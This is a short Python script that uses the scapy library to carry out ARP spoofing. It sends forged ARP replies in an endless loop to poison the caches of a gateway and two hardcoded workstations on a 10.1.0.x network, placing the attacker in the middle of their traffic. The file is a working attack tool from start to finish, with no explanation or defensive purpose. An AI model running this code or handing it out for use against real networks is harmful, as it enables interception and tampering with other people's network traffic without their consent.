import time
import scapy.all as scapy


def attack(target, gateway):
    print("Attack launched, stop with CTRL+C")
    try:
        while True:
            scapy.send(scapy.ARP(op=2, pdst=gateway,
                       hwdst=scapy.getmacbyip(gateway), psrc=target))
            scapy.send(scapy.ARP(op=2, pdst=target,
                       hwdst=scapy.getmacbyip(target), psrc=gateway))
            time.sleep(2)
    except KeyboardInterrupt:
        return


if __name__ == "__main__":
    # attack on workstations
    attack("10.1.0.2", "10.1.0.1")
    attack("10.1.0.3", "10.1.0.1")
